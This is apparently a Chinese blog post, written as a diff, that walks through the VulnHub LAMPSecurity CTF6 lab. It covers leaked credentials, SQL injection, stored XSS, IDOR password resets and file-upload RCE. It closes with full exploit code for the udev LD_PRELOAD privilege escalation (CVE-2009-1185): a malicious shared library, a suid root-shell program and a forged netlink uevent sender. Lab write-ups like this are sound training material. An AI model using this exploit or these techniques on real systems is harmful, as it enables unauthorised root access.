@@ -1,0 +1,331 @@
+---
+title: VulnHub LAMPSecurity：CTF6
+date: 2026-04-01 16:05:00
+categories: 
+  - VulnHub
+tags:
+  - 弱口令
+  - XSS
+  - SQL 注入
+  - 敏感信息泄露
+  - 任意文件读取
+  - 未授权访问
+  - 任意用户名重置
+  - 任意密码重置
+  - RCE
+  - 内核 udev 设备管理器（CVE-2009-1185）
+---
+
+# LAMPSecurity: CTF6
+
+项目地址：https://download.vulnhub.com/lampsecurity/ctf6.zip
+
+是一个打包好的镜像文件
+
+**注意：导入 vmx 时一定要选择我已移动，否则没网**
+
+使用 Nmap 扫描出开放服务及操作系统版本
+
+![](https://pic1.imgdb.cn/item/69704d27b931ecccdc5ba008.png)
+
+## 敏感信息泄露
+
+### /actions
+
+这个路径泄露了源码，可以用 dirb 扫出来
+
+![](https://pic1.imgdb.cn/item/697054bb388eb343186d47a7.png)
+
+### /sql/db.sql
+
+泄露了初始化数据库时的账号密码
+
+![](https://pic1.imgdb.cn/item/69705536388eb343186d4a21.png)
+
+## 弱口令
+
+### Widgets Inc
+
+使用上面泄露的账号密码登录成功
+
+```
+admin:adminpass
+```
+
+![](https://pic1.imgdb.cn/item/6970669f388eb343186d58ba.png)
+
+### phpMyAdmin
+
+通过 SQL 注入漏洞我们可以拿到数据库 `mysql` 库中 `user` 的账号密码
+
+![](https://pic1.imgdb.cn/item/69706b10388eb343186d600e.png)
+
+```
+root:mysqlpass
+```
+
+成功登录，可以打很多 Nday
+
+![](https://pic1.imgdb.cn/item/69706bad388eb343186d6114.png)
+
+## 未授权访问
+
+### Widgets Inc Log in
+
+抓取登陆包修改参数 `logged_in` 为 1
+
+![](https://pic1.imgdb.cn/item/697199de1404c8e205f1adf2.png)
+
+## SQL 注入
+
+### Widgets Inc id
+
+点击 Read more
+
+![](https://pic1.imgdb.cn/item/6970684e388eb343186d5b45.png)
+
+发现多了个 `id` 参数，推测为数字型，拼接 `or 1=1` 回显全部内容
+
+![](https://pic1.imgdb.cn/item/69706818388eb343186d5aee.png)
+
+### Widgets Inc Login（两个）
+
+漏洞点存在于登录框
+
+![](https://pic1.imgdb.cn/item/69709dd11404c8e205ef61a9.png)
+
+使用 SQLMap 可以跑出 Payload
+
+![](https://pic1.imgdb.cn/item/69709dbc1404c8e205ef61a5.png)
+
+测试另一个参数也存在，所以是两个
+
+![](https://pic1.imgdb.cn/item/69709d981404c8e205ef61a4.png)
+
+### Widgets Inc Manage Users Change password
+
+进入到 Manage Users 页面点击 Change password
+
+![](https://pic1.imgdb.cn/item/6970a3701404c8e205ef8212.png)
+
+观察 URL 发现多了一个 `id` 参数
+
+![](https://pic1.imgdb.cn/item/6970a3cb1404c8e205ef8217.png)
+
+存在 SQL 注入漏洞
+
+![](https://pic1.imgdb.cn/item/6970a3dc1404c8e205ef8218.png)
+
+## XSS
+
+### Widgets Inc Edit this event（两个存储）
+
+点击编辑
+
+![](https://pic1.imgdb.cn/item/69709e701404c8e205ef61be.png)
+
+植入两个 XSS Payload
+
+![](https://pic1.imgdb.cn/item/69709ea41404c8e205ef61c3.png)
+
+进入博客内部还会执行渲染一次
+
+![](https://pic1.imgdb.cn/item/69709f3b1404c8e205ef61f0.png)
+
+![](https://pic1.imgdb.cn/item/69709f4f1404c8e205ef61f1.png)
+
+## 任意用户名重置
+
+### Widgets Inc Update Username
+
+首先创建两个账号
+
+抓包 Update 更新 username
+
+![](https://pic1.imgdb.cn/item/697197e31404c8e205f1abed.png)
+
+替换为其他用户 `id`
+
+## 任意密码重置
+
+### Widgets Inc Change password
+
+登录一个测试账号点击修改密码
+
+![](https://pic1.imgdb.cn/item/697199181404c8e205f1ad2c.png)
+
+抓包改 `id` 可以重置其他人密码
+
+![](https://pic1.imgdb.cn/item/697198e41404c8e205f1acf6.png)
+
+成功更改
+
+![](https://pic1.imgdb.cn/item/697198161404c8e205f1ac1c.png)
+
+## RCE
+
+### Widgets Inc Add Event
+
+这里存在任意文件上传漏洞
+
+![](https://pic1.imgdb.cn/item/69715c3d1404c8e205f11a0f.png)
+
+连接成功
+
+![](https://pic1.imgdb.cn/item/69715d91388eb343186e435a.png)
+
+## 提权
+
+### 内核 udev 设备管理器（CVE-2009-1185）
+
+查看内核版本
+
+![](https://pic1.imgdb.cn/item/69715e36388eb343186e436c.png)
+
+查看具体版本
+
+```bash
+rpm -q kernel    # RPM 系Linux
+cat /proc/version
+```
+
+![](https://pic1.imgdb.cn/item/69715ffc388eb343186e43a0.png)
+
+搜索历史漏洞，首先排除 dos 系列，这只能让系统崩溃
+
+![](https://pic1.imgdb.cn/item/69716105388eb343186e43ba.png)
+
+复制脚本到当前目录下
+
+![](https://pic1.imgdb.cn/item/69716379388eb343186e4404.png)
+
+udev 通过 netlink 套接字接收内核发出的 uevent（设备事件）
+
+在旧版本中，udev 处理这些 uevent 时，**没有对环境变量进行充分的过滤**，导致攻击者可以注入如 `LD_PRELOAD` 这样的环境变量，进而使以 root 身份运行的 udevd 加载恶意共享库，执行任意代码
+
+该脚本分为几个主要步骤：
+
+1. 编译一个 C 程序 `udev.c`，用于向 udevd 发送伪造的 uevent（携带恶意环境变量）
+2. 编译一个恶意共享库 `libno_ex.so.1.0`，其 `_init()` 函数会在库被加载时自动执行，完成提权操作（将 `/tmp/suid` 设置为 suid root）
+3. 编译一个简单的 suid 程序 `/tmp/suid`，用于获得 root shell
+4. 执行 `/tmp/udev`，并传入一个参数（通常是 udevd 的 netlink 套接字所属进程的 PID），触发漏洞
+
+编译恶意共享库
+
+```c
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init()
+{
+    setgid(0);
+    setuid(0);
+    unsetenv("LD_PRELOAD");
+    execl("/bin/sh","sh","-c","chown root:root /tmp/suid; chmod +s /tmp/suid",NULL);
+}
+```
+
+- `_init` 是 GCC 的构造函数，当共享库被加载时自动执行（类似于 `.init` 段）
+- 函数内部：
+  - `setgid(0)` 和 `setuid(0)` 将进程权限提升为 root（因为此时 udevd 本身是以 root 运行的，所以这些调用会成功）
+  - `unsetenv("LD_PRELOAD")` 清除环境变量，避免递归加载
+  - 执行 shell 命令：将 `/tmp/suid` 的所有者改为 root，并设置 setuid 位
+
+编译共享库
+
+```bash
+gcc -o program.o -c program.c -fPIC
+gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
+```
+
+- `-fPIC`：生成位置无关代码，用于共享库
+- `-shared`：创建共享库
+- `-nostartfiles`：不链接标准启动文件，防止默认的 `_start` 干扰，确保 `_init` 是入口
+
+创建简单的 suid 程序
+
+```bash
+int main(void) {
+    setgid(0); setuid(0);
+    execl("/bin/sh","sh",0);
+}
+```
+
+- 该程序将在被设置为 suid root 后，直接 spawn 一个 root shell
+
+编译发送 uevent 的程序
+
+这个程序的核心是向 udevd 的 netlink 套接字发送一个伪造的 uevent 消息，并携带 `LD_PRELOAD` 环境变量
+
+```c
+int main(int argc, char **argv) {
+    char sysfspath[SHORT_STRING];
+    char subsystem[SHORT_STRING];
+    char event[SHORT_STRING];
+    char major[SHORT_STRING];
+    char minor[SHORT_STRING];
+
+    sprintf(event, "add");
+    sprintf(subsystem, "block");
+    sprintf(sysfspath, "/dev/foo");
+    sprintf(major, "8");
+    sprintf(minor, "1");
+
+    // 设置 netlink 地址
+    memset(&address, 0, sizeof(address));
+    address.nl_family = AF_NETLINK;
+    address.nl_pid = atoi(argv[1]);   // 从命令行传入 udevd 的 netlink PID
+    address.nl_groups = 0;
+
+    msg.msg_name = (void*)&address;
+    msg.msg_namelen = sizeof(address);
+    msg.msg_iov = &iovector;
+    msg.msg_iovlen = 1;
+
+    // 创建 netlink 套接字
+    socket_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
+    bind(socket_fd, (struct sockaddr *) &address, sizeof(address));
+
+    // 构造 uevent 消息
+    char message[LONG_STRING];
+    char *mp;
+    mp = message;
+    mp += sprintf(mp, "%s@%s", event, sysfspath) +1;      // 第一行：事件@路径
+    mp += sprintf(mp, "ACTION=%s", event) +1;
+    mp += sprintf(mp, "DEVPATH=%s", sysfspath) +1;
+    mp += sprintf(mp, "MAJOR=%s", major) +1;
+    mp += sprintf(mp, "MINOR=%s", minor) +1;
+    mp += sprintf(mp, "SUBSYSTEM=%s", subsystem) +1;
+    // 关键：注入恶意环境变量
+    mp += sprintf(mp, "LD_PRELOAD=/tmp/libno_ex.so.1.0") +1;
+
+    iovector.iov_base = (void*)message;
+    iovector.iov_len = (int)(mp-message);
+
+    // 发送消息
+    sendmsg(socket_fd, &msg, 0);
+    close(socket_fd);
+
+    sleep(10);
+    // 等待 /tmp/suid 被设置为 suid root，然后执行它
+    execl("/tmp/suid", "suid", (void*)0);
+}
+```
+
+查询该脚本对应的说明发现需要提供一个 Pid 进程号
+
+```
+cat /proc/net/netlink
+```
+
+![](https://pic1.imgdb.cn/item/6971642f388eb343186e441c.png)
+
+重复多次提权成功
+
+![](https://pic1.imgdb.cn/item/6971650c388eb343186e4424.png)
+
+## 补充说明
+
+本靶机 phpMyAdmin 可以直接打 Nday，所以不会记录
